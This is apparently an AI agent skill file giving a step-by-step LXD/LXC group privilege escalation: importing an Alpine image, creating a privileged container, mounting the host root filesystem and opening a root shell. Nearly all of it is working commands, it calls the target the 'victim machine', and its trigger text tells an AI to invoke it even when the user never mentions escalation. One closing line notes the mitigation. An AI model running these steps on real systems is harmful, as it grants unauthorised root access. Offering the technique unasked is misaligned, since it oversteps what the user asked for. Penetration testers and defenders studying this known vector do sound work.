---
name: lxd-privilege-escalation
description: Privilege escalation via LXD/LXC group membership. Use this skill whenever the user mentions LXD, LXC, container-based privilege escalation, or when they discover they belong to the lxd or lxc group on a Linux system. This skill provides step-by-step methods to gain root access through privileged container creation. Trigger this skill for any Linux privilege escalation scenario involving container groups, even if the user doesn't explicitly mention "privilege escalation" or "root access."
---

# LXD/LXC Group Privilege Escalation

If you belong to the **lxd** or **lxc** group on a Linux system, you can escalate to root by creating a privileged container that mounts the host filesystem.

## Why This Works

LXD/LXC containers can be configured with `security.privileged=true`, which allows the container to interact with the host filesystem as root. When you're in the lxd/lxc group, you have permission to create and configure these containers without needing root access yourself.

## Prerequisites

- You must be a member of the `lxd` or `lxc` group
- Verify with: `groups` or `id`
- The LXD service must be running

## Method 1: Download Alpine Image from Canonical

This method downloads a pre-built Alpine image from Canonical's repository.

### Step 1: Download the Alpine Image

```bash
# Navigate to the latest build directory
# Directory name is the date (e.g., 20240115_1200)
wget https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/latest/lxd.tar.xz
wget https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/latest/rootfs.squashfs
```

### Step 2: Import the Image

```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list  # Verify the image is there
```

### Step 3: Initialize LXD Storage (if needed)

If you get the error `Error: No storage pool found. Please create a new storage pool`, run:

```bash
lxd init
```

Accept all defaults when prompted.

### Step 4: Create a Privileged Container

```bash
lxc init alpine privesc -c security.privileged=true
lxc list  # Verify the container exists
```

### Step 5: Mount the Host Filesystem

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

### Step 6: Start the Container and Get Root

```bash
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root  # The host filesystem is mounted here
```

You now have root access to the host system.

## Method 2: Build Alpine Image Locally

Use this method if you have internet access and can build the image yourself.

### Step 1: Clone and Build the Alpine Image

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder

# Update the build script to use a stable release
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine

# Build the image (adjust architecture as needed)
sudo ./build-alpine -a i686
```

### Step 2: Import the Image

```bash
# IMPORTANT: Run this from your HOME directory on the victim machine
lxc image import ./alpine*.tar.gz --alias myimage
```

### Step 3: Initialize LXD Storage

```bash
lxd init
```

Accept all defaults when prompted.

### Step 4: Create and Configure the Container

```bash
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

### Step 5: Start and Access Root

```bash
lxc start mycontainer
lxc exec mycontainer /bin/sh
cd /mnt/root
```

## Alternative: Build Image with Distrobuilder

If you need to build a custom image, use the LXC distrobuilder:

```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone and build distrobuilder
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder
cd ./distrobuilder
make

# Prepare Alpine configuration
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Build the image
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64

# Import and use (files will be incus.tar.xz and rootfs.squashfs)
lxc image import incus.tar.xz rootfs.squashfs --alias alpine
```

## Common Issues and Solutions

### "No storage pool found"

```bash
lxd init
```

Then repeat the container creation commands.

### Image import fails

- Ensure you're running the import command from your HOME directory
- Check that both files (tar.xz and squashfs) are in the same directory
- Verify the files aren't corrupted

### Architecture mismatch

When building locally, match the host architecture:
- `x86_64` for 64-bit Intel/AMD
- `i686` for 32-bit Intel/AMD
- `arm64` for ARM 64-bit

## Verification

After gaining access, verify you have root on the host:

```bash
whoami  # Should show root
id      # Should show uid=0(root)
cat /etc/passwd  # Should be readable
```

## Cleanup (Optional)

After you're done, you can remove the container:

```bash
lxc stop privesc
lxc delete privesc
lxc image delete alpine
```

## Notes

- This technique works because privileged containers bypass most LXD security restrictions
- The `recursive=true` flag ensures all subdirectories are mounted
- The container's `/mnt/root` maps to the host's `/`
- This is a well-known privilege escalation vector and should be mitigated by removing users from the lxd/lxc groups
